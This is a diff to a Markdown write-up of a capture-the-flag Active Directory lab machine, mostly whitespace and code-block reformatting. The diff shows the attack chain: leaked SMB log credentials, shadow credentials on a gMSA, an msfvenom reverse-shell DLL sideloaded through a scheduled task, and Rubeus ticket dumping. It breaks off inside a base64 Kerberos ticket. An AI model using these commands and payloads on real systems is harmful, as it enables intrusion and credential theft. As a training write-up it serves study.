@@ -25,21 +25,20 @@ tags:
 
 ### 💻 Target Information
 - **Machine Name:** Logging
-- **Operating System:** Windows Server 2019
+- **Operating System:** Windows
 - **Difficulty:** Medium
 - **Vulnerabilities:** Plaintext Credentials in Public SMB Share Logs, Shadow Credentials on gMSA Account, DLL Sideloading in UpdateMonitor, ADCS ESC17 (Rogue WSUS Server Spoofing)
 
 ---
 
-```text
-\------------------------------------------------------------------------------------Logging-Writeup-------------------------------------------------------------------------------------------
-```
 
 ## Step 1 - Reconnaissance
 
 ```bash
 nmap -A -sS -P -T4  --min-rate 5000 10.129.23.177
+```
 
+```text
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-19 13:54 UTC
 
 Nmap scan report for 10.129.23.177
@@ -193,7 +192,9 @@ Nmap done: 1 IP address (1 host up) scanned in 85.79 seconds
 
 ```bash
 nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@'
+```
 
+```text
 SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
 
 SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.everette:Welcome2026@
@@ -203,7 +204,9 @@ SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.eve
 
 ```bash
 nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --users
+```
 
+```text
 SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
 
 SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.everette:Welcome2026@
@@ -241,7 +244,9 @@ SMB         10.129.23.177   445    DC01             [*] Enumerated 12 local user
 
 ```bash
 nxc smb 10.129.23.177 -u 'wallace.everette' -p 'Welcome2026@' --shares
+```
 
+```text
 SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
 
 SMB         10.129.23.177   445    DC01             [+] logging.htb\\wallace.everette:Welcome2026@
@@ -273,22 +278,24 @@ SMB         10.129.23.177   445    DC01             WSUSTemp                    
 
 ```bash
 smbclient //10.129.23.177/Logs -U 'logging.htb\\wallace.everette%Welcome2026@'
+```
 
+```text
 Try "help" to get a list of possible commands.
 
 smb: \\> ls
 
-&#x20; .                                   D        0  Thu Apr 16 23:10:09 2026
+  .                                   D        0  Thu Apr 16 23:10:09 2026
 
-&#x20; ..                                  D        0  Thu Apr 16 23:10:09 2026
+  ..                                  D        0  Thu Apr 16 23:10:09 2026
 
-&#x20; Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
+  Audit_Heartbeat.log                 A     1294  Thu Apr 16 23:10:09 2026
 
-&#x20; IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
+  IdentitySync_Trace_20260219.log      A     8488  Thu Apr 16 23:10:09 2026
 
-&#x20; Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
+  Service_State.log                   A      468  Thu Apr 16 23:10:09 2026
 
-&#x20; TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
+  TaskMonitor.log                     A     1170  Thu Apr 16 23:10:09 2026
 ```
 
 - 🔍 *save them in your machine.*
@@ -362,19 +369,17 @@ smb: \\> ls
 
 [2026-02-19 03:00:03.488] [PID:4102] [Thread:04] ERROR - System.DirectoryServices.Protocols.LdapException: A local error occurred.
 
-&#x20;  at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
+   at System.DirectoryServices.Protocols.LdapConnection.Bind(NetworkCredential credential)
 
-&#x20;  at logging.IdentitySync.Engine.LdapProvider.Connect()
+   at logging.IdentitySync.Engine.LdapProvider.Connect()
 
-&#x20;  --- Server Error Details ---
+   --- Server Error Details ---
 
-&#x20;  Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
+   Server error: 8009030C: LdapErr: DSID-0C090569, comment: AcceptSecurityContext error, data 52e, v4563
 
-&#x20;  Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
+   Hex Error: 0x31 (LDAP_INVALID_CREDENTIALS)
 
-&#x20;  Win32 Error: 49 (Invalid Credentials)
-
-&#x20;  ----------------------------
+   Win32 Error: 49 (Invalid Credentials)
 
 [2026-02-19 03:00:03.510] [PID:4102] [Thread:12] WARN  - Connectivity failed for logging\\svc_recovery. Checking alternate Domain Controller...
 
@@ -462,23 +467,23 @@ smb: \\> ls
 - 🔍 *Now While looking at the Bloodhound, i found out that*
 
 ```text
-&#x09;svc_recovery
+svc_recovery
 
-&#x09;     ↓
+	     ↓
 
-&#x09; GenericWrite
+	 GenericWrite
 
-&#x09;     ↓
+	     ↓
 
-&#x09; msa_health$
+	 msa_health$
 
-&#x09;     **↓**
+	     **↓**
 
-&#x09;  memberOF
+	  memberOF
 
-&#x20;	     ↓
+ 	     ↓
 
-&#x20;     Remote Management  (probably will get User Flag!)
+      Remote Management  (probably will get User Flag!)
 ```
 
 > [!IMPORTANT]
@@ -497,45 +502,47 @@ smb: \\> ls
 ```bash
 bloodyAD -u svc_recovery -p 'Em3rg3ncyPa$$2026' \\
 
-&#x20;        -d logging.htb \\
+         -d logging.htb \\
 
-&#x20;        --host 10.129.23.177 \\
+         --host 10.129.23.177 \\
+```
 
-&#x20;        add groupMember msa_health$ svc_recovery
+```text
+add groupMember msa_health$ svc_recovery
 
 Traceback (most recent call last):
 
-&#x20; File "/home/kali/Tools/bloodyAD/venv/bin/bloodyAD", line 8, in <module>
+  File "/home/kali/Tools/bloodyAD/venv/bin/bloodyAD", line 8, in <module>
 
-&#x20;   sys.exit(main())
+    sys.exit(main())
 
-&#x20;            ^^^^^^
+             ^^^^^^
 
-&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
+  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
 
-&#x20;   output = args.func(conn, **params)
+    output = args.func(conn, **params)
 
-&#x20;            ^^^^^^^^^^^^^^^^^^^^^^^^^
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/add.py", line 391, in groupMember
+  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/add.py", line 391, in groupMember
 
-&#x20;   member_transformed = conn.ldap.dnResolver(member)
+    member_transformed = conn.ldap.dnResolver(member)
 
-&#x20;                        ^^^^^^^^^
+                         ^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/config.py", line 132, in ldap
+  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/config.py", line 132, in ldap
 
-&#x20;   self._ldap = Ldap(self)
+    self._ldap = Ldap(self)
 
-&#x20;                ^^^^^^^^^^
+                 ^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 206, in __init__
+  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 206, in __init__
 
-&#x20;   raise e
+    raise e
 
-&#x20; File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 192, in __init__
+  File "/home/kali/Tools/bloodyAD/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 192, in __init__
 
-&#x20;   raise err
+    raise err
 
 msldap.commons.exceptions.LDAPBindException: LDAP Bind failed! Result code: **"invalidCredentials"** Reason: "b'8009030C: LdapErr: DSID-0C0906F8, comment: AcceptSecurityContext error, data 52f, v4563\\x00'"
 ```
@@ -544,7 +551,9 @@ msldap.commons.exceptions.LDAPBindException: LDAP Bind failed! Result code: **"i
 
 ```bash
 nxc smb 10.129.23.177 -u svc_recovery -p 'Em3rg3ncyPa$$2026'
+```
 
+```text
 SMB         10.129.23.177   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:False)
 
 SMB         10.129.23.177   445    DC01             **[-] logging.htb\\svc_recovery:Em3rg3ncyPa$$2025 STATUS_ACCOUNT_RESTRICTION**
@@ -566,7 +575,9 @@ Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its a
 
 ```bash
 klist
+```
 
+```text
 Ticket cache: FILE:svc_recovery.ccache
 
 Default principal: svc_recovery@LOGGING.HTB
@@ -575,7 +586,7 @@ Valid starting       Expires              Service principal
 
 04/20/2026 22:15:34  04/21/2026 02:15:34  krbtgt/LOGGING.HTB@LOGGING.HTB
 
-&#x20;       renew until 04/21/2026 02:15:34
+        renew until 04/21/2026 02:15:34
 ```
 
 - 🔍 *Now lets add the account to the read list!*
@@ -583,65 +594,67 @@ Valid starting       Expires              Service principal
 ```bash
 bloodyAD -u svc_recovery -k \\
 
-&#x20;        -d logging.htb \\
+         -d logging.htb \\
 
-&#x20;        --host dc01.logging.htb \\
+         --host dc01.logging.htb \\
+```
 
-&#x20;        set object msa_health$ msDS-GroupMSAMembership \\
+```text
+set object msa_health$ msDS-GroupMSAMembership \\
 
-&#x20;        -v 'CN=svc_recovery,CN=Users,DC=logging,DC=htb'
+         -v 'CN=svc_recovery,CN=Users,DC=logging,DC=htb'
 
 Traceback (most recent call last):
 
-&#x20; File "/home/kali/Tools/NetExec/venv/bin/bloodyAD", line 8, in <module>
+  File "/home/kali/Tools/NetExec/venv/bin/bloodyAD", line 8, in <module>
 
-&#x20;   sys.exit(main())
+    sys.exit(main())
 
-&#x20;            ^^^^^^
+             ^^^^^^
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/main.py", line 210, in main
 
-&#x20;   output = args.func(conn, **params)
+    output = args.func(conn, **params)
 
-&#x20;            ^^^^^^^^^^^^^^^^^^^^^^^^^
+             ^^^^^^^^^^^^^^^^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/set.py", line 58, in object
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/cli_modules/set.py", line 58, in object
 
-&#x20;   conn.ldap.bloodymodify(
+    conn.ldap.bloodymodify(
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 315, in bloodymodify
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/network/ldap.py", line 315, in bloodymodify
 
-&#x20;   raise err
+    raise err
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/connection.py", line 615, in modify
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/connection.py", line 615, in modify
 
-&#x20;   'changes' : encode_changes(changes, encode)
+    'changes' : encode_changes(changes, encode)
 
-&#x20;               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 496, in encode_changes
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 496, in encode_changes
 
-&#x20;   attributes = encoder(value, True)
+    attributes = encoder(value, True)
 
-&#x20;                ^^^^^^^^^^^^^^^^^^^^
+                 ^^^^^^^^^^^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/formatters/formatters.py", line 106, in genericFormat
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/bloodyAD/formatters/formatters.py", line 106, in genericFormat
 
-&#x20;   return origin_format(val, encode, *args)
+    return origin_format(val, encode, *args)
 
-&#x20;          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 116, in single_sd
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/msldap/protocol/typeconversion.py", line 116, in single_sd
 
-&#x20;   x = SECURITY_DESCRIPTOR.from_sddl(x)
+    x = SECURITY_DESCRIPTOR.from_sddl(x)
 
-&#x20;       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 
-&#x20; File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/winacl/dtyp/security_descriptor.py", line 166, in from_sddl
+  File "/home/kali/Tools/NetExec/venv/lib/python3.12/site-packages/winacl/dtyp/security_descriptor.py", line 166, in from_sddl
 
-&#x20;   params[np[i]] = np[i+1]
+    params[np[i]] = np[i+1]
 
-&#x20;                   ~~^^^^^
+                    ~~^^^^^
 
 IndexError: list index out of range
 ```
@@ -665,28 +678,24 @@ Every AD object has an attribute called msDS-KeyCredentialLink which stores trus
 
 Attacker generates cert keypair
 
-&#x20;       ↓
+        ↓
 
 Writes cert into msa_health$'s msDS-KeyCredentialLink
 
-&#x20;       ↓
+        ↓
 
 DC now trusts that cert to authenticate AS msa_health$
 
-&#x20;       ↓
+        ↓
 
 Attacker uses private key to get TGT as msa_health$
 
-&#x20;       ↓
+        ↓
 
 Extract NT hash → WinRM in
 ```
 
 - 🔍 *easy, lets do some action now!*
-
-```text
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
 
 ## Step 2 - Initial Foothold!
 
@@ -695,11 +704,13 @@ Extract NT hash → WinRM in
 ```bash
 bloodyAD -u svc_recovery -k \\
 
-&#x20;        -d logging.htb \\
+         -d logging.htb \\
 
-&#x20;        --host dc01.logging.htb \\
+         --host dc01.logging.htb \\
+```
 
-&#x20;        add shadowCredentials msa_health$
+```text
+add shadowCredentials msa_health$
 
 [+] KeyCredential generated with following sha256 of RSA key: 6b872e5e15c4069dfa9b46b06e10e94d6def5ff6e3c75165fd47d924568cc104
 
@@ -717,24 +728,26 @@ bloodyAD -u svc_recovery -k \\
 
 ```bash
 bloodyAD add shadowCredentials
+```
 
-&#x20;       ↓
+```text
+↓
 
 Generates RSA keypair internally
 
-&#x20;       ↓
+        ↓
 
 Writes cert to msDS-KeyCredentialLink (uses svc_recovery's GenericWrite)
 
-&#x20;       ↓
+        ↓
 
 Immediately performs PKINIT auth using the cert
 
-&#x20;       ↓
+        ↓
 
 Uses the resulting TGT to call KERB-AS-REP and derive NT hash
 
-&#x20;       ↓
+        ↓
 
 Dumps everything: ccache + NT hash
 ```
@@ -744,19 +757,13 @@ Dumps everything: ccache + NT hash
 ```bash
 evil-winrm -i logging.htb -u 'msa_health$' -H '603fc24ee01a9409f83c9d1d701485c5'
 
-&#x20;
-
 Evil-WinRM shell v3.7
+```
 
-&#x20;
-
+```text
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
 
-&#x20;
-
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-&#x20;
 
 Info: Establishing connection to remote endpoint
 
@@ -774,7 +781,7 @@ Info: Establishing connection to remote endpoint
 ```text
 *Evil-WinRM* PS C:\\Program Files> ls
 
-&#x20;   Directory: C:\\Program Files
+    Directory: C:\\Program Files
 
 Mode                LastWriteTime         Length Name
 
@@ -818,35 +825,33 @@ d-----        9/15/2018  12:19 AM                WindowsPowerShell
 ```text
 icacls "C:\\Program Files\\UpdateMonitor"
 
-&#x20;
-
 C:\\Program Files\\UpdateMonitor logging\\IT:(OI)(CI)(F)
 
-&#x20;                              NT SERVICE\\TrustedInstaller:(I)(F)
+                               NT SERVICE\\TrustedInstaller:(I)(F)
 
-&#x20;                              NT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F)
+                               NT SERVICE\\TrustedInstaller:(I)(CI)(IO)(F)
 
-&#x20;                              NT AUTHORITY\\SYSTEM:(I)(F)
+                               NT AUTHORITY\\SYSTEM:(I)(F)
 
-&#x20;                              NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F)
+                               NT AUTHORITY\\SYSTEM:(I)(OI)(CI)(IO)(F)
 
-&#x20;                              BUILTIN\\Administrators:(I)(F)
+                               BUILTIN\\Administrators:(I)(F)
 
-&#x20;                              BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)
+                               BUILTIN\\Administrators:(I)(OI)(CI)(IO)(F)
 
-&#x20;                              BUILTIN\\Users:(I)(RX)
+                               BUILTIN\\Users:(I)(RX)
 
-&#x20;                              BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE)
+                               BUILTIN\\Users:(I)(OI)(CI)(IO)(GR,GE)
 
-&#x20;                              CREATOR OWNER:(I)(OI)(CI)(IO)(F)
+                               CREATOR OWNER:(I)(OI)(CI)(IO)(F)
 
-&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
+                               APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
 
-&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+                               APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
 
-&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+                               APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
-&#x20;                              APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
+                               APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(OI)(CI)(IO)(GR,GE)
 
 Successfully processed 1 files; Failed processing 0 files
 ```
@@ -858,15 +863,15 @@ Successfully processed 1 files; Failed processing 0 files
 
 C:\\Program Files\\UpdateMonitor\\UpdateMonitor.exe logging\\IT:(I)(F)
 
-&#x20;                                                NT AUTHORITY\\SYSTEM:(I)(F)
+                                                 NT AUTHORITY\\SYSTEM:(I)(F)
 
-&#x20;                                                BUILTIN\\Administrators:(I)(F)
+                                                 BUILTIN\\Administrators:(I)(F)
 
-&#x20;                                                BUILTIN\\Users:(I)(RX)
+                                                 BUILTIN\\Users:(I)(RX)
 
-&#x20;                                                APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
+                                                 APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
 
-&#x20;                                                APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
+                                                 APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
 
 Successfully processed 1 files; Failed processing 0 files
 ```
@@ -902,15 +907,15 @@ Successfully processed 1 files; Failed processing 0 files
 - 🔍 *Attack Plan:-*
 
 ```text
-&#x20;> Will Create a dll file with Reverse Shell to our nc listener
+> Will Create a dll file with Reverse Shell to our nc listener
 
-&#x20;> Will convert it to .zip format
+ > Will convert it to .zip format
 
-&#x20;> Will upload the file into  C:\\ProgramData\\UpdateMonitor as Settings_Update.zip
+ > Will upload the file into  C:\\ProgramData\\UpdateMonitor as Settings_Update.zip
 
-&#x20;> The Scheduled Task will extract the zip file and load it into C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll
+ > The Scheduled Task will extract the zip file and load it into C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll
 
-&#x20;> The file get executed as jaylee.clifto!
+ > The file get executed as jaylee.clifto!
 ```
 
 - 🔍 *Lets Begin!*
@@ -919,10 +924,12 @@ Successfully processed 1 files; Failed processing 0 files
 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp \\
+```
 
-&#x20;   LHOST="your_ip" LPORT=6666 \\
+```text
+LHOST="your_ip" LPORT=6666 \\
 
-&#x20;   -f dll -o settings_update.dll
+    -f dll -o settings_update.dll
 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 
@@ -942,8 +949,10 @@ Saved as: settings_update.dll
 ```bash
 sudo msfconsole -q \\
 
-&#x20;   -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"
+    -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT 6666; run"
+```
 
+```text
 [*] Using configured payload generic/shell_reverse_tcp
 
 payload => windows/meterpreter/reverse_tcp
@@ -957,9 +966,11 @@ LPORT => 6666
 
 - 🔍 *Convert the dll into zip*
 
-```text
-&#x20;zip Settings_Update.zip settings_update.dll
+```bash
+zip Settings_Update.zip settings_update.dll
+```
 
+```text
 updating: settings_update.dll (deflated 82%)
 ```
 
@@ -968,15 +979,9 @@ updating: settings_update.dll (deflated 82%)
 ```text
 *Evil-WinRM* PS C:\\ProgramData\\UpdateMonitor> upload Settings_Update.zip
 
-&#x20;
-
 Info: Uploading /home/kali/HTB/Season-10/Logging/Settings_Update.zip to C:\\ProgramData\\UpdateMonitor\\Settings_Update.zip
 
-&#x20;
-
 Data: 2432 bytes of 2432 bytes copied
-
-&#x20;
 
 Info: Upload successful!
 ```
@@ -999,8 +1004,6 @@ meterpreter > getuid
 [2026-04-23 14:53:15] Successfully unzipped update to C:\\Program Files\\UpdateMonitor\\bin\\
 
 [2026-04-23 14:53:15] Loading update applier: C:\\Program Files\\UpdateMonitor\\bin\\settings_update.dll
-
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 ```
 
 ## Step 3 - Privsec
@@ -1023,24 +1026,28 @@ upload /home/kali/Tools/Rubeus/Rubeus/Rubeus.exe C:\\\\Users\\\\Public
 Type Shell and enter
 
 and then-->
+```
 
+```bash
 C:\\temp>.\\Rubeus.exe tgtdeleg /nowrap
+```
 
+```text
 .\\Rubeus.exe tgtdeleg /nowrap
 
-&#x20;  ______        _
+   ______        _
 
-&#x20; (_____ \\      | |
+  (_____ \\      | |
 
-&#x20;  _____) )_   _| |__  _____ _   _  ___
+   _____) )_   _| |__  _____ _   _  ___
 
-&#x20; |  __  /| | | |  _ \\| ___ | | | |/___)
+  |  __  /| | | |  _ \\| ___ | | | |/___)
 
-&#x20; | |  \\ \\| |_| | |_) ) ____| |_| |___ |
+  | |  \\ \\| |_| | |_) ) ____| |_| |___ |
 
-&#x20; |_|   |_|____/|____/|_____)____/(___/
+  |_|   |_|____/|____/|_____)____/(___/
 
-&#x20; v2.3.3
+  v2.3.3
 
 [*] Action: Request Fake Delegation TGT (current user)
 
@@ -1062,7 +1069,7 @@ C:\\temp>.\\Rubeus.exe tgtdeleg /nowrap
 
 [*] base64(ticket.kirbi):
 
-&#x20;     **doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuinaHjSnK4H3+76qTnTuJtdNPVj9GkpJW0kBE8SsQu7ulvVA/HuqBdu5LnwTcopvyeqlhU1xwT3X6a/5D+c/H8Zu0MC+NboZSJq4E+vkoZiaxNa9e2eyk8BQ1kl5Jv/OKKnLp5GFRCMvbYX82HEyan94aR5+pzC38RmGJv4fhkso+iRbWTluA0kRJpPXVE3BAMR50hbJXH+VwJZy7kR32+1EYK/vJeqwpDmGh/mgma8XwUf5wdd7NqPs3rixtVZoHEeb7C0wnIf780xdGDdH2weEM5AVZzUwDS2P5RJhSnYnSKUIcDZeBNWGUE16Y1PIoFr7cM9RBn9raG7qKosXe0mXRWsAt7jus8eR0RLA4zJKB35J8e0hTLtYjw3dXFOk3zJ98yzYR72agfuD5b2SqdHITg55EWVyMLQFVJGz44zuL0o30FBwCYFJQtvh6eb99SL8tq6dhsQA4Ha9VtHEAk/btvHh7Su0ESSnwU4CfNp7/0qbB5ueCm5KzSgFtzFSEzKL4OHEnnmroRjFpWoZNElZ/H8eyLE/8kLKhXoVL4mcWy/dR/fRErMWmjH+71txB6eXaylR0bCtFF81afH5joHjAPDLxbfyLFOWa5XYiCeJcYr+/NX1ojqeSWdHN2Ql31NZUTiMVHZeg2HnZZU9L4b+QpKVwWk3BI3jYhLCBCYQrIFvYJHiAsevhtJxUm3Jmt9sbZNqjoBx/0R8Kvyr7dMWpUoWf4aDRm3IsNR4l3gGqRgURip2A0svqh6x5laGTtK6RqXAg3DtUFSXEq4fFsaMACcxENlsIUcbTtDYxKiOiCaMfRqYmX90sYvLlzwknBojqFJQkUMsCgO06YgxKVuYoaxwHZm6+jzmQdO5O5RUXesonq7lYjOx4hvJxXySzihieZp4m8VTYHn+8qplbnw+Fkh8V+omVy6ocHV/5ZLVjCB4PeMjakBKs2hhvj0S4gR/j9gVNokooIwCn1RIfkyBpo/69iqy+D3himqRALjuyzSpxJTJbtWjFRThPwlN5wTb+rMLlyMNC8mReesXs0m+oSoRKuwd2UIaMSb2Vivfvq59XbfD3B26wRGE04F32gyzkQpgbJn7hPCygGWJ6imECPTewOziXqGrtzg+V2rs9cIHlrLMuLnOndIPInhfSKVplef4fVvs+swfR1Vm/0GrTXsOLnFhKDK0i+bZ5Pp/ekIrrO0/cmThMJqvk2PTAzeOk/5TUVF+3e55n47s6mFzcGXH4x9SRJ+c/OXe2xU2Zq9OYOzwgvN0AtWrt+5PeVk0sOHFD8ZrOvuftWMvADbj1VowpZ+KqBGX5a4FZAUKtdSb0SAPPFWrXU7P8KOVwkw/xkOp8F1TwqhVn+bbHr1bgFaXuscGncIHBWshASanobqty0iNx/SN7BxmAlCO7hqx5GSHxA7IH4188F7ieKVvcrXInn6jpcQzPhtchXmY0YnvY0Mu7dXUw8BCatjdW23ZHAQ8G6YaGPR+0O9kqcMfPo82tIkffRNoJrYDRo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgYTO9mSJfirf3Z6DaIicdVmCJmWPCFzrSFxtMkJHsmXKhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDQyNDIxMzcwOFqmERgPMjAyNjA0MjUwNzMyMTVapxEYDzIwMjYwNTAxMjEzMjE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=**
+      **doIFyDCCBcSgAwIBBaEDAgEWooIEyjCCBMZhggTCMIIEvqADAgEFoQ0bC0xPR0dJTkcuSFRCoiAwHqADAgECoRcwFRsGa3JidGd0GwtMT0dHSU5HLkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRuinaHjSnK4H3+76qTnTuJtdNPVj9GkpJW0kBE8SsQu7ulvVA/HuqBdu5LnwTcopvyeqlhU1xwT3X6a/5D+c/H8Zu0MC+NboZSJq4E+vkoZiaxNa9e2eyk8BQ1kl5Jv/OKKnLp5GFRCMvbYX82HEyan94aR5+pzC38RmGJv4fhkso+iRbWTluA0kRJpPXVE3BAMR50hbJXH+VwJZy7kR32+1EYK/vJeqwpDmGh/mgma8XwUf5wdd7NqPs3rixtVZoHEeb7C0wnIf780xdGDdH2weEM5AVZzUwDS2P5RJhSnYnSKUIcDZeBNWGUE16Y1PIoFr7cM9RBn9raG7qKosXe0mXRWsAt7jus8eR0RLA4zJKB35J8e0hTLtYjw3dXFOk3zJ98yzYR72agfuD5b2SqdHITg55EWVyMLQFVJGz44zuL0o30FBwCYFJQtvh6eb99SL8tq6dhsQA4Ha9VtHEAk/btvHh7Su0ESSnwU4CfNp7/0qbB5ueCm5KzSgFtzFSEzKL4OHEnnmroRjFpWoZNElZ/H8eyLE/8kLKhXoVL4mcWy/dR/fRErMWmjH+71txB6eXaylR0bCtFF81afH5joHjAPDLxbfyLFOWa5XYiCeJcYr+/NX1ojqeSWdHN2Ql31NZUTiMVHZeg2HnZZU9L4b+QpKVwWk3BI3jYhLCBCYQrIFvYJHiAsevhtJxUm3Jmt9sbZNqjoBx/0R8Kvyr7dMWpUoWf4aDRm3IsNR4l3gGqRgURip2A0svqh6x5laGTtK6RqXAg3DtUFSXEq4fFsaMACcxENlsIUcbTtDYxKiOiCaMfRqYmX90sYvLlzwknBojqFJQkUMsCgO06YgxKVuYoaxwHZm6+jzmQdO5O5RUXesonq7lYjOx4hvJxXySzihieZp4m8VTYHn+8qplbnw+Fkh8V+omVy6ocHV/5ZLVjCB4PeMjakBKs2hhvj0S4gR/j9gVNokooIwCn1RIfkyBpo/69iqy+D3himqRALjuyzSpxJTJbtWjFRThPwlN5wTb+rMLlyMNC8mReesXs0m+oSoRKuwd2UIaMSb2Vivfvq59XbfD3B26wRGE04F32gyzkQpgbJn7hPCygGWJ6imECPTewOziXqGrtzg+V2rs9cIHlrLMuLnOndIPInhfSKVplef4fVvs+swfR1Vm/0GrTXsOLnFhKDK0i+bZ5Pp/ekIrrO0/cmThMJqvk2PTAzeOk/5TUVF+3e55n47s6mFzcGXH4x9SRJ+c/OXe2xU2Zq9OYOzwgvN0AtWrt+5PeVk0sOHFD8ZrOvuftWMvADbj1VowpZ+KqBGX5a4FZAUKtdSb